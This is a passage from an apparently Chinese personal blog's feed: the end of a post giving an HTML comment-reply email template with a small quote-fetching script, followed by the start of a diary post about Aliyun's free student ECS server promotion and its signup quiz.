class="attribute">white-space</span>: normal;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">word-wrap</span>: break-word;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">min-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">td</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">input</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">button</span>,</span></span><br><span class="line"><span class="language-css">    select,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-family</span>: Helvetica, <span class="string">&quot;Microsoft Yahei&quot;</span>, verdana;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    pre &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">white-space</span>: pre-wrap;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">white-space</span>: -moz-pre-wrap;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">white-space</span>: -pre-wrap;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">white-space</span>: -o-pre-wrap;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">word-wrap</span>: break-word;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">95%</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">th</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-family</span>: arial, verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">line-height</span>: <span class="number">1.666</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">header</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">footer</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">section</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">aside</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">article</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">nav</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">hgroup</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">figure</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">figcaption</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">blockquote</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin-right</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;ntes_link_color&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span>,</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">td</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: <span class="number">#236da1</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>给用户的模板替换为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">base</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      ::-webkit-scrollbar &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;cloudAttachStyle&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#divNeteaseBigAttach</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#divNeteaseBigAttach_bak</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;blockquoteStyle&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">blockquote</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">tabindex</span>=<span class="string">&quot;0&quot;</span> <span class="attr">role</span>=<span class="string">&quot;listitem&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background: white;</span></span></span><br><span class="line"><span class="string"><span class="tag">        width: 95%;</span></span></span><br><span class="line"><span class="string"><span class="tag">        max-width: 800px;</span></span></span><br><span class="line"><span class="string"><span class="tag">        margin: auto auto;</span></span></span><br><span class="line"><span class="string"><span class="tag">        border-radius: 5px;</span></span></span><br><span class="line"><span class="string"><span class="tag">        border:orange 1px solid;</span></span></span><br><span class="line"><span class="string"><span class="tag">        overflow: hidden;</span></span></span><br><span class="line"><span class="string"><span class="tag">        -webkit-box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.12);</span></span></span><br><span class="line"><span class="string"><span class="tag">        box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.18);&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">header</span> <span class="attr">style</span>=<span class="string">&quot;overflow: hidden;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;z-index: 666;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U5bb04af32be544c4b41206d9a42fcacfd.jpg&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;padding: 5px 20px;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;position: relative;</span></span></span><br><span class="line"><span class="string"><span class="tag">          color: white;</span></span></span><br><span class="line"><span class="string"><span class="tag">          float: left;</span></span></span><br><span class="line"><span class="string"><span class="tag">          z-index: 999;</span></span></span><br><span class="line"><span class="string"><span class="tag">          background: orange;</span></span></span><br><span class="line"><span class="string"><span class="tag">          padding: 5px 30px;</span></span></span><br><span class="line"><span class="string"><span class="tag">          margin: -25px auto 0 ;</span></span></span><br><span class="line"><span class="string"><span class="tag">          box-shadow: 5px 5px 5px rgba(0, 0, 0, 0.30)&quot;</span>&gt;</span></span><br><span class="line">            Dear<span class="symbol">&amp;nbsp;</span>$&#123;PARENT_NICK&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">              来自<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration: none;color: orange &quot;</span>&gt;</span>$&#123;NICK&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>的回复</span><br><span class="line">            <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">          <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            $&#123;PARENT_NICK&#125;，您在<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration: none;color: orange &quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">href</span>=<span class="string">&quot;$&#123;POST_URL&#125;#comments&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span>$&#123;SITE_NAME&#125;<span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>上曾发表的评论：</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">            $&#123;PARENT_COMMENT&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">          <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">          padding-bottom: 20px;</span></span></span><br><span class="line"><span class="string"><span class="tag">      &quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: orange;&quot;</span>&gt;</span>$&#123;NICK&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 给您回复啦~~~：</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">center</span></span></span><br><span class="line"><span class="tag">              <span class="attr">style</span>=<span class="string">&quot;border-bottom:#ddd 1px solid;border-left:#ddd 1px solid;padding-bottom:20px;background-color:#eee;margin:15px 0px;padding-left:20px;padding-right:20px;border-top:#ddd 1px solid;border-right:#ddd 1px solid;padding-top:20px&quot;</span>&gt;</span></span><br><span class="line">              $&#123;COMMENT&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;margin-top: 40px;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U0968ee80fd5c4f05a02bdda9709b041eE.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;hr&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;</span></span></span><br><span class="line"><span class="string"><span class="tag">                                                                                                    margin:5px auto 5px auto;</span></span></span><br><span class="line"><span class="string"><span class="tag">                                                                                                    display: block;&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-transform: uppercase;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        text-decoration: none;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        font-size: 14px;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        border: 2px solid #6c7575;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        color: #2f3333;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        padding: 10px;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        display: inline-block;</span></span></span><br><span class="line"><span class="string"><span class="tag">   <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span>  margin: 10px auto 0; &quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">href</span>=<span class="string">&quot;$&#123;POST_URL&#125;#comments&quot;</span>&gt;</span>$&#123;SITE_NAME&#125;｜传送！Biu~<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="symbol">&amp;nbsp;</span> <span class="symbol">&amp;nbsp;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 12px;text-align: center;color: #999;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;hitokoto&quot;</span>&gt;</span></span><br><span class="line">            欢迎常来做客哦！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 12px;text-align: center;color: #999;&quot;</span>&gt;</span>© 2020 <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;text-decoration:none; color:orange&quot;</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;SITE_URL&#125;&quot;</span>&gt;</span> $&#123;SITE_NAME&#125; <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> _c = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      _c.<span class="property">innerHTML</span> = (_c.<span class="property">innerHTML</span> || <span class="string">&quot;&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">replace</span>(<span class="regexp">/(href|formAction|onclick|javascript)/gi</span>, <span class="string">&quot;__$1&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">replace</span>(<span class="regexp">/&lt;\/?marquee&gt;/gi</span>, <span class="string">&quot;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">      xhr.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;https://v1.hitokoto.cn/?c=e&amp;c=j&amp;c=k&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> hitokoto = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hitokoto&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">          hitokoto.<span class="property">innerText</span> = data.<span class="property">hitokoto</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: arial, verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">line-height</span>: <span class="number">1.666</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">overflow</span>: auto;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">white-space</span>: normal;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">word-wrap</span>: break-word;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">min-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">td</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">input</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">button</span>,</span></span><br><span class="line"><span class="language-css">      select,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: Helvetica, <span class="string">&quot;Microsoft Yahei&quot;</span>, verdana;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      pre &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">white-space</span>: pre-wrap;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">white-space</span>: -moz-pre-wrap;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">white-space</span>: -pre-wrap;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">white-space</span>: -o-pre-wrap;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">word-wrap</span>: break-word;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">95%</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">th</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-family</span>: arial, verdana, sans-serif;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">line-height</span>: <span class="number">1.666</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">header</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">footer</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">section</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">aside</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">article</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">nav</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">hgroup</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">figure</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">figcaption</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">blockquote</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-right</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;ntes_link_color&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">a</span>,</span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">td</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#236da1</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为原来的模板的变量写法不一样，而且变量也多了，我这里已经改成DesertP版本的了，不过博主的邮件模板里面注意修改没有使用变量的地方如<code>GamerNoTitle</code>哦</p></div><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>最近着手于美化一下博客，想在右边加上一个像火喵那样的基于Gitalk的动态面板，顺带改一下友链界面</p><p>昨天已经上了强制HTTPS访问啦！就上不了CloudFlare的CDN了，不过没有减速CDN也会快的吧</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽05 - 【阿里云限时活动】免费领取6个月ESC服务器，到期前一个月还能免费续费多半年</title>
      <link href="/posts/diary5/"/>
      <url>/posts/diary5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>活动网址：<a href="https://developer.aliyun.com/adc/student/">https://developer.aliyun.com/adc/student/</a></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@diary5/img/Diary5/Website.png" alt="网页"></p><p>近期，阿里云开启了白给活动，叫做<code>阿里云高校学生“在家实践”计划</code>，官方描述是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@diary5/img/Diary5/Descr.png" alt="白给活动描述"></p><p>然后往下拉，可以看到这个活动分成5个部分：</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@diary5/img/Diary5/Steps.png" alt="五步"></p><p>①注册&#x2F;登录 ②学生认证 ③完成测试 ④领取ECS学习资源 ⑤开始课程学习</p><p>其实这五部分就前面三个部分是需要我们进行的。注册和登录就不用多说了；学生认证：如果你是在校大学生，那么这个认证对你来说很轻松；<del>如果你不是在校大学生，没关系！按照阿里云官方的说法，24岁以下都算学生。</del> 事实证明还是要完成学生认证……</p><p>然后麻烦的东西是测试，这个测试共有10道题目，每道题10分，具体说明如下：</p><blockquote><h2 id="学生成长计划领取资格考试-云计算及云服务器入门"><a href="#学生成长计划领取资格考试-云计算及云服务器入门" class="headerlink" title="学生成长计划领取资格考试 - 云计算及云服务器入门"></a>学生成长计划领取资格考试 - 云计算及云服务器入门</h2><h4 id="共10道题-限时10分钟"><a href="#共10道题-限时10分钟" class="headerlink" title="共10道题 限时10分钟"></a>共10道题 限时10分钟</h4><p>知识点考察范围：云计算概念、云服务器ECS基础知识。学习《云计算的前世今生》（链接: <a href="https://developer.aliyun.com/course/1236%EF%BC%89%E3%80%81%E3%80%8A7%E5%A4%A9%E7%8E%A9%E8%BD%AC%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%8B">https://developer.aliyun.com/course/1236）、《7天玩转云服务器》</a> (链接: <a href="https://developer.aliyun.com/course/70">https://developer.aliyun.com/course/70</a>) 课程将有助于提升考试通过率。</p><hr><h3 id="答题开始即开始计时，中途不可暂停，如超时则自动提交"><a href="#答题开始即开始计时，中途不可暂停，如超时则自动提交" class="headerlink" title="答题开始即开始计时，中途不可暂停，如超时则自动提交"></a>答题开始即开始计时，中途不可暂停，如超时则自动提交</h3><p>1、考试共 (10) 道题，总分100分，及格分数60分<br>2、考试需在（10分钟）内交卷，过程中无法暂停，请提前安排好时间；如未及时交卷，则本次考试作废<br>3、推荐使用 Chrome 